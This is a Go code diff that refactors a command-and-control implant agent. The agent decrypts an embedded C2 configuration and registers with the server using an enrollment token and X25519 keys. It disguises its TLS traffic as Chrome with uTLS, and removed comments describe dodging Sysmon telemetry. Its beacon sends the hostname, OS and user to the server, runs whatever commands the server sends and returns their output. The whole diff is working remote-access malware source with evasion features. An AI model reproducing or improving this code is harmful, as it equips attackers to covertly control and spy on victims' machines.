@@ -12,7 +12,6 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	mrand "math/rand"
 	"io"
 	"io/ioutil"
 	"net"
@@ -41,6 +40,7 @@ var (
 	c2UrlsBytes    []byte
 	serverPubBytes []byte
 	serverPinsList []string
+	enrollmentTokenBytes []byte
 )
 
 type BeaconData struct {
@@ -198,10 +198,7 @@ func wipeBytes(b []byte) {
 // initConfig assembles the split key, decrypts the config blob, parses it, and wipes secrets from memory
 func initConfig() error {
 	if EncBlob == "" {
-		// Fallback for local testing if not built via builder.py
-		c2UrlsBytes = []byte("http://127.0.0.1:8443")
-		serverPubBytes = []byte("dHVteV9rZXk=")
-		return nil
+		return fmt.Errorf("missing encrypted C2 configuration")
 	}
 	
 	// Runtime Assembly of Split Encoding Key
@@ -227,6 +224,10 @@ func initConfig() error {
 	// Populate global byte slices (not strings, to avoid immutable copies)
 	c2UrlsBytes = []byte(conf["urls"])
 	serverPubBytes = []byte(conf["pub"])
+	enrollmentTokenBytes = []byte(conf["enrollment_token"])
+	if len(c2UrlsBytes) == 0 || len(serverPubBytes) == 0 || len(enrollmentTokenBytes) == 0 {
+		return fmt.Errorf("incomplete C2 configuration")
+	}
 	if conf["pins"] != "" {
 		serverPinsList = strings.Split(conf["pins"], ",")
 	}
@@ -243,29 +244,66 @@ func initConfig() error {
 	return nil
 }
 
+func newHTTPClient() *http.Client {
+	allowedPins := append([]string(nil), serverPinsList...)
+	transport := &http.Transport{
+		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
+			if err != nil {
+				return nil, err
+			}
+			serverName := addr
+			if host, _, splitErr := net.SplitHostPort(addr); splitErr == nil {
+				serverName = host
+			}
+			config := &utls.Config{
+				ServerName: serverName,
+				InsecureSkipVerify: len(allowedPins) > 0,
+				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+					if len(allowedPins) == 0 {
+						return nil
+					}
+					for _, rawCert := range rawCerts {
+						cert, parseErr := x509.ParseCertificate(rawCert)
+						if parseErr != nil {
+							continue
+						}
+						spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
+						spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
+						for _, pin := range allowedPins {
+							if pin == spkiB64 {
+								return nil
+							}
+						}
+					}
+					return fmt.Errorf("SPKI pin mismatch")
+				},
+			}
+			uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
+			if err := uConn.Handshake(); err != nil {
+				dialConn.Close()
+				return nil, err
+			}
+			return uConn, nil
+		},
+	}
+	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
+}
+
 // register with the C2 using X25519
 func register() error {
-	AgentID = "AGT-" + fmt.Sprintf("%d", time.Now().UnixNano())
-	
 	priv, pub, err := generateX25519KeyPair()
 	if err != nil {
 		return err
 	}
 	
-	// Default dummy server key if not injected during build
-	if len(serverPubBytes) == 0 {
-		serverPubBytes = []byte("dHVteV9rZXk=") // Should be overridden by initConfig
+	srvPub, err := base64.StdEncoding.DecodeString(string(serverPubBytes))
+	if err != nil || len(srvPub) != 32 {
+		return fmt.Errorf("invalid server X25519 public key")
 	}
-	
-	srvPub := make([]byte, base64.StdEncoding.DecodedLen(len(serverPubBytes)))
-	n, _ := base64.StdEncoding.Decode(srvPub, serverPubBytes)
-	srvPub = srvPub[:n]
-	
-	if len(srvPub) == 32 {
-		sessionKey, _ = deriveSharedKey(priv, srvPub)
-	} else {
-		// Fallback for local testing without injected key
-		sessionKey = make([]byte, 32)
+	sessionKey, err = deriveSharedKey(priv, srvPub)
+	if err != nil {
+		return err
 	}
 
 	hostname, _ := os.Hostname()
@@ -288,6 +326,7 @@ func register() error {
 	payload := map[string]string{
 		"client_pub": base64.StdEncoding.EncodeToString(pub),
 		"data":       encData,
+		"enrollment_token": string(enrollmentTokenBytes),
 	}
 
 	body, _ := json.Marshal(payload)
@@ -302,225 +341,193 @@ func register() error {
 	req.Header.Set("Content-Type", "application/json")
 	// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
 	
-	// Multi-Pin TLS Validation (SPKI)
-	allowedPins := serverPinsList
-	
-	// uTLS Configuration: Mimic Google Chrome JA3/JA4
-	transport := &http.Transport{
-		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-			dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
-			if err != nil {
-				return nil, err
-			}
-			
-			config := &utls.Config{
-				InsecureSkipVerify: true,
-				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
-					if len(allowedPins) == 0 {
-						return nil
-					}
-					for _, rawCert := range rawCerts {
-						cert, err := x509.ParseCertificate(rawCert)
-						if err != nil { continue }
-						spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
-						spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
-						for _, pin := range allowedPins {
-							if pin == spkiB64 { return nil }
-						}
-					}
-					return fmt.Errorf("SPKI pin mismatch")
-				},
-			}
-			
-			uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
-			err = uConn.Handshake()
-			if err != nil {
-				dialConn.Close()
-				return nil, err
-			}
-			return uConn, nil
-		},
-	}
-	
-	client := &http.Client{
-		Transport: transport,
-		Timeout: 30 * time.Second,
-	}
+	client := newHTTPClient()
 
 	resp, err := client.Do(req)
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("registration rejected with status %d", resp.StatusCode)
+	}
 	
 	// Server responds with initial config, encrypted with the new shared key
-	respBody, _ := ioutil.ReadAll(resp.Body)
+	respBody, err := ioutil.ReadAll(io.LimitReader(resp.Body, 64*1024))
+	if err != nil {
+		return err
+	}
 	var c2Resp map[string]string
 	if err := json.Unmarshal(respBody, &c2Resp); err != nil {
 		return err
 	}
 	
-	_, err = decryptAESGCM(sessionKey, c2Resp["data"])
+	registrationData, err := decryptAESGCM(sessionKey, c2Resp["data"])
 	if err != nil {
 		return err
 	}
+	var registration map[string]interface{}
+	if err := json.Unmarshal(registrationData, &registration); err != nil {
+		return err
+	}
+	assignedID, ok := registration["agent_id"].(string)
+	if !ok || !strings.HasPrefix(assignedID, "AGT-") {
+		return fmt.Errorf("server did not assign an agent identity")
+	}
+	AgentID = assignedID
+	wipeBytes(enrollmentTokenBytes)
+	enrollmentTokenBytes = nil
 	
 	return nil
 }
 
-func chunkedBeacon(results []TaskResult) error {
+type cappedBuffer struct {
+	buffer bytes.Buffer
+	limit int
+	truncated bool
+}
+
+func (writer *cappedBuffer) Write(value []byte) (int, error) {
+	originalLength := len(value)
+	remaining := writer.limit - writer.buffer.Len()
+	if remaining <= 0 {
+		writer.truncated = true
+		return originalLength, nil
+	}
+	if len(value) > remaining {
+		value = value[:remaining]
+		writer.truncated = true
+	}
+	_, _ = writer.buffer.Write(value)
+	return originalLength, nil
+}
+
+func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]map[string]string, error) {
+	hostname, _ := os.Hostname()
 	payload := map[string]interface{}{
 		"agent_id": AgentID,
-		"results":  results,
+		"hostname": hostname,
+		"os": runtime.GOOS,
+		"user": os.Getenv("USER"),
+		"results": results,
+		"acks": acknowledgements,
 	}
-	jsonData, _ := json.Marshal(payload)
-	
-	// Profile-driven pacing for large payloads (Mime-aware behavior)
-	// We split large JSON data into chunks of ~16KB (similar to max TLS record size)
-	chunkSize := 16384
-	totalLen := len(jsonData)
-	
-	for i := 0; i < totalLen; i += chunkSize {
-		end := i + chunkSize
-		if end > totalLen {
-			end = totalLen
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return nil, err
+	}
+	if len(jsonData) > 700*1024 {
+		return nil, fmt.Errorf("beacon payload exceeds limit")
+	}
+	encData, err := encryptAESGCM(sessionKey, jsonData)
+	if err != nil {
+		return nil, err
+	}
+	reqBody, err := json.Marshal(map[string]string{"data": encData})
+	if err != nil {
+		return nil, err
+	}
+	urls := strings.Split(string(c2UrlsBytes), ",")
+	if len(urls) == 0 || strings.TrimSpace(urls[0]) == "" {
+		return nil, fmt.Errorf("no C2 URL configured")
+	}
+	req, err := http.NewRequest(
+		"POST",
+		strings.TrimRight(strings.TrimSpace(urls[0]), "/")+"/beacon",
+		bytes.NewBuffer(reqBody),
+	)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Agent-ID", AgentID)
+	resp, err := newHTTPClient().Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("beacon rejected with status %d", resp.StatusCode)
+	}
+	respBody, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1024*1024))
+	if err != nil {
+		return nil, err
+	}
+	var encryptedResponse map[string]string
+	if err := json.Unmarshal(respBody, &encryptedResponse); err != nil {
+		return nil, err
+	}
+	decrypted, err := decryptAESGCM(sessionKey, encryptedResponse["data"])
+	if err != nil {
+		return nil, err
+	}
+	var response struct {
+		Tasks []map[string]string `json:"tasks"`
+	}
+	if err := json.Unmarshal(decrypted, &response); err != nil {
+		return nil, err
+	}
+	return response.Tasks, nil
+}
+
+func executeTask(task map[string]string) TaskResult {
+	result := TaskResult{TaskID: task["task_id"]}
+	parts := strings.Fields(task["command"])
+	if result.TaskID == "" || len(parts) == 0 {
+		result.Error = "invalid task"
+		return result
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
+	defer cancel()
+	command := exec.CommandContext(ctx, parts[0], parts[1:]...)
+	output := &cappedBuffer{limit: 256 * 1024}
+	command.Stdout = output
+	command.Stderr = output
+	err := command.Run()
+	result.Output = output.buffer.String()
+	if output.truncated {
+		result.Error = "output limit exceeded"
+	} else if ctx.Err() == context.DeadlineExceeded {
+		result.Error = "task timeout"
+	} else if err != nil {
+		result.Error = err.Error()
+	}
+	return result
+}
+
+func chunkedBeacon(results []TaskResult) error {
+	tasks, err := exchangeBeacon(results, nil)
+	if err != nil {
+		return err
+	}
+	if len(tasks) == 0 {
+		return nil
+	}
+	acknowledgements := make([]string, 0, len(tasks))
+	for _, task := range tasks {
+		if task["task_id"] != "" {
+			acknowledgements = append(acknowledgements, task["task_id"])
 		}
-		
-		chunk := jsonData[i:end]
-		encData, _ := encryptAESGCM(sessionKey, chunk)
-		
-		// Send chunk
-		reqBody, _ := json.Marshal(map[string]string{
-			"data": encData,
-			"chunk_index": fmt.Sprintf("%d", i/chunkSize),
-			"is_final": fmt.Sprintf("%t", end == totalLen),
-		})
-		
-		// Select random C2 URL from Fallbacks
-		urls := strings.Split(string(c2UrlsBytes), ",")
-		currentC2 := urls[0] // Simplify for now
-		
-		req, err := http.NewRequest("POST", currentC2+"/beacon", bytes.NewBuffer(reqBody))
-		if err != nil {
-			return err
+	}
+	additional, err := exchangeBeacon(nil, acknowledgements)
+	if err != nil {
+		return err
+	}
+	known := make(map[string]bool, len(tasks))
+	for _, task := range tasks {
+		known[task["task_id"]] = true
+	}
+	for _, task := range additional {
+		if !known[task["task_id"]] {
+			tasks = append(tasks, task)
 		}
-		
-		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("Agent-ID", AgentID)
-		// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
-		
-		// Multi-Pin TLS Validation (SPKI)
-		allowedPins := serverPinsList
-		
-		// uTLS Configuration: Mimic Google Chrome JA3/JA4
-		transport := &http.Transport{
-			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-				dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
-				if err != nil {
-					return nil, err
-				}
-				
-				config := &utls.Config{
-					InsecureSkipVerify: true,
-					VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
-						if len(allowedPins) == 0 {
-							return nil
-						}
-						for _, rawCert := range rawCerts {
-							cert, err := x509.ParseCertificate(rawCert)
-							if err != nil { continue }
-							spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
-							spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
-							for _, pin := range allowedPins {
-								if pin == spkiB64 { return nil }
-							}
-						}
-						return fmt.Errorf("SPKI pin mismatch")
-					},
-				}
-				
-				// Create a uTLS client imitating Chrome
-				uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
-				err = uConn.Handshake()
-				if err != nil {
-					dialConn.Close()
-					return nil, err
-				}
-				return uConn, nil
-			},
-		}
-		
-		client := &http.Client{
-			Transport: transport,
-			Timeout: 30 * time.Second,
-		}
-		
-		resp, err := client.Do(req)
-		if err != nil {
-			// Backoff on failure
-			time.Sleep(2 * time.Second)
-			continue
-		}
-		
-		respBody, _ := ioutil.ReadAll(resp.Body)
-		resp.Body.Close()
-		
-		if end == totalLen {
-			// Only process new tasks on the final chunk's response
-			var c2Resp map[string]string
-			if err := json.Unmarshal(respBody, &c2Resp); err == nil && c2Resp["data"] != "" {
-				decData, err := decryptAESGCM(sessionKey, c2Resp["data"])
-				if err == nil {
-					var tasks map[string][]map[string]string
-					json.Unmarshal(decData, &tasks)
-					
-					var newResults []TaskResult
-					for _, task := range tasks["tasks"] {
-						var out []byte
-						var err error
-						cmdStr := task["command"]
-						
-						// Telemetry Avoidance: Handle basic commands via native Go API instead of spawning a shell
-						// This avoids anomalous Process Creations (Sysmon EID 1)
-						parts := strings.Split(cmdStr, " ")
-						if len(parts) > 0 && parts[0] == "ls" {
-							dir := "."
-							if len(parts) > 1 { dir = parts[1] }
-							files, e := ioutil.ReadDir(dir)
-							if e != nil {
-								err = e
-							} else {
-								var sb strings.Builder
-								for _, f := range files {
-									sb.WriteString(f.Name() + "\n")
-								}
-								out = []byte(sb.String())
-							}
-						} else if len(parts) > 0 && parts[0] == "pwd" {
-							dir, e := os.Getwd()
-							if e != nil { err = e } else { out = []byte(dir + "\n") }
-						} else {
-							// Fallback to direct execution instead of wrapping in sh/cmd if possible
-							// For complex pipelines, it's still needed, but we avoid cmd.exe /c for simple bins
-							cmd := exec.Command(parts[0], parts[1:]...)
-							out, err = cmd.CombinedOutput()
-						}
-						
-						res := TaskResult{TaskID: task["task_id"], Output: string(out)}
-						if err != nil {
-							res.Error = err.Error()
-						}
-						newResults = append(newResults, res)
-					}
-					if len(newResults) > 0 {
-						go chunkedBeacon(newResults)
-					}
-				}
-			}
-		} else {
-			// Pacing: Micro-sleep between chunks to simulate TCP flow/App logic
-			time.Sleep(time.Millisecond * time.Duration(100+mrand.Intn(400)))
-		}
+	}
+	newResults := make([]TaskResult, 0, len(tasks))
+	for _, task := range tasks {
+		newResults = append(newResults, executeTask(task))
+	}
+	if len(newResults) > 0 {
+		go chunkedBeacon(newResults)
 	}
 	return nil
 }
